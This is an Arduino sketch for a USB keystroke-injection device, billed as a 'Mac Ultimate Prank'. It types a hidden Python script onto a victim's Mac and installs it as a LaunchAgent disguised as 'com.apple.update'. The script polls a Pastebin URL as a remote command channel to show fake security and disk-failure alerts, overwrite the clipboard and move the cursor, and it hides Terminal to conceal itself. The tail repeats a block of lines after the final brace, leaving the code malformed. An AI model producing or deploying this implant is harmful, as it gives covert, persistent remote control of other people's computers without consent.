#include <Keyboard.h>

// Arduino Pro Micro / Leonardo — Mac Ultimate Prank
// !! Replace XXXXXXXX with your own Pastebin raw ID before flashing !!
//
// PASTEBIN COMMAND FORMAT:
//   COMMAND          — fires once, ~30s delay
//   COMMAND HH:MM    — fires once at that time of day
//   STOP             — kills everything, removes all files
//
// COMMANDS: JIGGLE MINIMISE SOUND NOTIFY CLIPBOARD ZOOM
//           CAPS VOLUME CLOSE SPEECH DARK INVERT STOP

// Accepts both RAM strings and F() flash strings
void typeln(const char* s) {
  Keyboard.print(s);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(100);
}
void typeln(const __FlashStringHelper* s) {
  Keyboard.print(s);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(100);
}

void setup() {
  Keyboard.begin();
  delay(5000);

  // Cmd+Space → Spotlight → Terminal
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(' ');
  Keyboard.releaseAll();
  delay(1200);
  Keyboard.print(F("Terminal"));
  delay(500);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(4000);

  // === Single combined file: all pranks + Pastebin watcher ===
  typeln(F("cat>/tmp/.t.py<<'E'"));
  typeln(F("import subprocess,time,urllib.request,plistlib,os,pathlib,datetime,hashlib,random,glob"));
  typeln(F("la=os.path.expanduser('~/Library/LaunchAgents/com.apple.update.plist')"));
  typeln(F("pathlib.Path(os.path.dirname(la)).mkdir(exist_ok=True)"));
  typeln(F("if not os.path.exists(la):"));
  typeln(F(" d={'Label':'com.apple.update','ProgramArguments':['/usr/bin/python3','/tmp/.t.py'],'RunAtLoad':True}"));
  typeln(F(" open(la,'wb').write(plistlib.dumps(d))"));
  typeln(F(" subprocess.run(['launchctl','load',la])"));

  // Prank functions — each fires once and returns
  typeln(F("def jiggle():"));
  typeln(F(" from Quartz import CGWarpMouseCursorPosition"));
  typeln(F(" CGWarpMouseCursorPosition((random.randint(0,3840),random.randint(0,2160)))"));
  typeln(F("def minimise():subprocess.run(['osascript','-e','tell application \"System Events\" to keystroke \"m\" using {command down}'])"));
  typeln(F("def sound():subprocess.run(['afplay',random.choice(glob.glob('/System/Library/Sounds/*.aiff'))])"));
  typeln(F("def notify():"));
  typeln(F(" t=['Critical Error','Security Warning','System Failure','Disk Error','Memory Fault','Network Breach']"));
  typeln(F(" m=['A critical system error has occurred','Suspicious activity detected on this Mac','macOS has stopped working correctly','Hard drive read error. Backup data immediately','RAM allocation failure. Restart required','Unauthorised remote access attempt blocked']"));
  typeln(F(" i=random.randint(0,5)"));
  typeln(F(" subprocess.run(['osascript','-e','display notification \"'+m[i]+'\" with title \"'+t[i]+'\"'])"));
  typeln(F("def clipboard():"));
  typeln(F(" m=['what did you copy','nice try','I already read that','that belongs to me now','clipboard accessed','did you mean to copy that']"));
  typeln(F(" subprocess.run(['bash','-c','echo \"'+random.choice(m)+'\" | pbcopy'])"));
  typeln(F("def zoom():subprocess.run(['osascript','-e','tell application \"System Events\" to keystroke \"=\" using {command down}'])"));
  typeln(F("def caps():subprocess.run(['osascript','-e','tell application \"System Events\" to key code 57'])"));
  typeln(F("def volume():subprocess.run(['osascript','-e','set volume output volume '+str(random.randint(0,100))])"));
  typeln(F("def close():subprocess.run(['osascript','-e','tell application \"System Events\" to keystroke \"w\" using {command down}'])"));
  typeln(F("def speech():"));
  typeln(F(" m=['Hi','Message from PC','Hi there','Hello','Can you hear me','I am your computer']"));
  typeln(F(" subprocess.Popen(['say',random.choice(m)])"));
  typeln(F("def dark():subprocess.run(['osascript','-e','tell app \"System Events\" to tell appearance preferences to set dark mode to not dark mode'])"));
  typeln(F("def invert():subprocess.run(['osascript','-e','tell application \"System Events\" to keystroke \"8\" using {command down, option down, control down}'])"));

  // Command dispatch table
  typeln(F("cmds={'JIGGLE':jiggle,'MINIMISE':minimise,'SOUND':sound,'NOTIFY':notify,'CLIPBOARD':clipboard,'ZOOM':zoom,'CAPS':caps,'VOLUME':volume,'CLOSE':close,'SPEECH':speech,'DARK':dark,'INVERT':invert}"));

  // Pastebin watcher — polls every 30s, fires each command once per paste version
  typeln(F("URL='https://pastebin.com/raw/XXXXXXXX'"));
  typeln(F("def fetch():"));
  typeln(F(" try:return urllib.request.urlopen(URL,timeout=5).read().decode().strip()"));
  typeln(F(" except:return ''"));
  typeln(F("fired=set()"));
  typeln(F("while True:"));
  typeln(F(" txt=fetch()"));
  typeln(F(" h=hashlib.md5(txt.encode()).hexdigest()"));
  typeln(F(" now=datetime.datetime.now()"));
  typeln(F(" stop=False"));
  typeln(F(" for ln in txt.splitlines():"));
  typeln(F("  parts=ln.strip().split()"));
  typeln(F("  if not parts:continue"));
  typeln(F("  cmd=parts[0]"));
  typeln(F("  sched=len(parts)>=2 and ':' in parts[1]"));
  typeln(F("  if sched:"));
  typeln(F("   try:"));
  typeln(F("    sh,sm=map(int,parts[1].split(':'))"));
  typeln(F("    key=(cmd,sh,sm,str(now.date()))"));
  typeln(F("    if now.hour==sh and abs(now.minute-sm)<1 and key not in fired:"));
  typeln(F("     fired.add(key)"));
  typeln(F("     if cmd=='STOP':stop=True;break"));
  typeln(F("     if cmd in cmds:cmds[cmd]()"));
  typeln(F("   except:pass"));
  typeln(F("  else:"));
  typeln(F("   key=(cmd,h)"));
  typeln(F("   if key not in fired:"));
  typeln(F("    fired.add(key)"));
  typeln(F("    if cmd=='STOP':stop=True;break"));
  typeln(F("    if cmd in cmds:cmds[cmd]()"));
  typeln(F(" if stop:"));
  typeln(F("  subprocess.run(['launchctl','unload',la])"));
  typeln(F("  try:os.remove(la)"));
  typeln(F("  except:pass"));
  typeln(F("  try:os.remove('/tmp/.t.py')"));
  typeln(F("  except:pass"));
  typeln(F("  break"));
  typeln(F(" time.sleep(30)"));
  typeln(F("E"));

  // Install Quartz, launch watcher silently, hide Terminal
  typeln(F("python3 -m pip install pyobjc-framework-Quartz -q;nohup python3 /tmp/.t.py&disown;osascript -e 'tell app \"Terminal\" to set miniaturized of every window to true'"));
}

void loop() {}
  typeln(F("     if cmd=='STOP':stop=True;break"));
  typeln(F("     if cmd in cmds:cmds[cmd]()"));
  typeln(F("   except:pass"));
  typeln(F("  else:"));
  typeln(F("   key=(cmd,h)"));
  typeln(F("   if key not in fired:"));
  typeln(F("    fired.add(key)"));
  typeln(F("    if cmd=='STOP':stop=True;break"));
  typeln(F("    if cmd in cmds:cmds[cmd]()"));
  typeln(F(" if stop:"));
  typeln(F("  subprocess.run(['launchctl','unload',la])"));
  typeln(F("  try:os.remove(la)"));
  typeln(F("  except:pass"));
  typeln(F("  try:os.remove('/tmp/.t.py')"));
  typeln(F("  except:pass"));
  typeln(F("  break"));
  typeln(F(" time.sleep(30)"));
  typeln(F("E"));

  // Install Quartz, launch watcher silently, hide Terminal
  typeln(F("python3 -m pip install pyobjc-framework-Quartz -q;nohup python3 /tmp/.t.py&disown;osascript -e 'tell app \"Terminal\" to set miniaturized of every window to true'"));
}

void loop() {}
